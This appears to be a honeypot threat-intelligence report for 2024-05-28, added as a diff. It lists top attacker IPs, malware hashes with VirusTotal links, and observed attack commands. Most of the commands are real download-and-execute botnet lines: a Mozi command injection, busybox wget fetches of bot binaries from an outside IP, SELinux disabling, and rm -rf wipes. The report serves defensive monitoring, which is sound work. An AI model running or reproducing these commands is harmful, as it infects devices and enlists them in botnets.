@@ -1,0 +1,68 @@
+Top 5 IPs for 2024-05-28 :
+
+77.222.187.73
+182.116.9.114
+42.232.226.190
+42.242.122.159
+117.253.214.56
+
+
+Malware Observed:
+
+145240f65dbe766738065e484c455e9a910e915a68e94196777f3a806e7aca7e
+https://www.virustotal.com/gui/file/145240f65dbe766738065e484c455e9a910e915a68e94196777f3a806e7aca7e
+88d52a85946ef9904bd55e491a84faf3c180aac2d0e37ec025d4e1435320f224
+https://www.virustotal.com/gui/file/88d52a85946ef9904bd55e491a84faf3c180aac2d0e37ec025d4e1435320f224
+c2b65dbea78fbc7281039a2f7ed77764dae5f7578513b9c839b5504b3f06f674
+https://www.virustotal.com/gui/file/c2b65dbea78fbc7281039a2f7ed77764dae5f7578513b9c839b5504b3f06f674
+e3484c388f3b956b4c905e3b0a1cab5cb19d59c9718a1a1e5e7fd25162c22ddf
+https://www.virustotal.com/gui/file/e3484c388f3b956b4c905e3b0a1cab5cb19d59c9718a1a1e5e7fd25162c22ddf
+
+
+Commands/exploits observed:
+
+/language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://182.122.219.219:58998/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+
+pkill -f bot.arm7
+pkill -f bot.arm
+pkill -f bot.x86
+pkill -f bot.x86_64
+su 0 pkill -f bot.arm7
+su 0 pkill -f bot.arm
+su 0 pkill -f bot.x86
+su 0 pkill -f bot.x86_64
+su 0 setenforce 0
+su 0 busybox wget http://61.14.232.254/a -O /data/local/tmp/; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a
+busybox wget http://61.14.232.254/a; chmod 777 a;sh a
+busybox wget http://61.14.232.254/bot.arm; chmod 777 bot.arm; ./bot.arm android
+busybox wget http://61.14.232.254/bot.arm5; chmod 777 bot.arm5; ./bot.arm5 android
+busybox wget http://61.14.232.254/bot.arm6; chmod 777 bot.arm6; ./bot.arm6 android
+busybox wget http://61.14.232.254/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 android
+busybox wget http://61.14.232.254/bot.m68k; chmod 777 bot.m68k; ./bot.m68k android
+busybox wget http://61.14.232.254/bot.mips; chmod 777 bot.mips; ./bot.mips android
+busybox wget http://61.14.232.254/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl android
+busybox wget http://61.14.232.254/bot.ppc; chmod 777 bot.ppc; ./bot.ppc android
+busybox wget http://61.14.232.254/bot.sh4; chmod 777 bot.sh4; ./bot.sh4 android
+busybox wget http://61.14.232.254/bot.spc; chmod 777 bot.spc; ./bot.spc android
+busybox wget http://61.14.232.254/bot.x86; chmod 777 bot.x86; ./bot.x86 android
+busybox wget http://61.14.232.254/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 android
+su 0 busybox wget http://61.14.232.254/bot.arm -O /data/local/tmp/bot.arm;su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.arm android
+su 0 busybox wget http://61.14.232.254/bot.arm5 -O /data/local/tmp/bot.arm5; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.arm5 android
+su 0 busybox wget http://61.14.232.254/bot.arm6 -O /data/local/tmp/bot.arm6; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.arm6 android
+su 0 busybox wget http://61.14.232.254/bot.arm7 -O /data/local/tmp/bot.arm7; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.arm7 android
+su 0 busybox wget http://61.14.232.254/bot.m68k -O /data/local/tmp/bot.m68k; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.m68k android
+su 0 busybox wget http://61.14.232.254/bot.mips -O /data/local/tmp/bot.mips; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.mips android
+su 0 busybox wget http://61.14.232.254/bot.mpsl -O /data/local/tmp/bot.mpsl; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.mpsl android
+su 0 busybox wget http://61.14.232.254/bot.ppc -O /data/local/tmp/bot.ppc; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.ppc android
+su 0 busybox wget http://61.14.232.254/bot.sh4 -O /data/local/tmp/bot.sh4; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.sh4 android
+su 0 busybox wget http://61.14.232.254/bot.spc -O /data/local/tmp/bot.spc; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.spc android
+su 0 busybox wget http://61.14.232.254/bot.x86 -O /data/local/tmp/bot.x86; su 0 chmod 777 /data/local/tmp/bot.*; su 0 /data/local/tmp/bot.x86 android
+su 0 busybox wget http://61.14.232.254/bot.x86_64 -O /data/local/tmp/bot.x86_64; su 0 chmod 777 /data/local/tmp/bot.* su 0 /data/local/tmp/bot.x86_64 android
+rm -rf a*
+rm -rf ahihi
+rm -rf *
+rm -rf and
+ 
+
+
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *bot.arm* ; rm -rf *bot.ppc* ; rm -rf *bot.x86* ; rm -rf *bot.mips* ;rm -rf *bot.mpsl* ; rm -rf *bot.spc* ; rm -rf *bot.m68k* ; busybox wget http://61.14.232.254/w.sh; sh w.sh; wget http://61.14.232.254/c.sh; sh c.sh; curl http://61.14.232.254/wget.sh; sh wget.sh; su 0 iptables -9; setenforce 0; busybox wget http://61.14.232.254/ahihi || su 0 busybox wget http://61.14.232.254/ahihi; chmod 777 ahihi || su 0 chmod 777 ahihi; sh ahihi; su 0 mv /data/local/tmp /data/local/;su 0 chmod 777 /data/local;su 0 echo hacker /data/local/tmp; su 0 chmod 444 /data/local; ulimit 999999; > %Spawned worker!
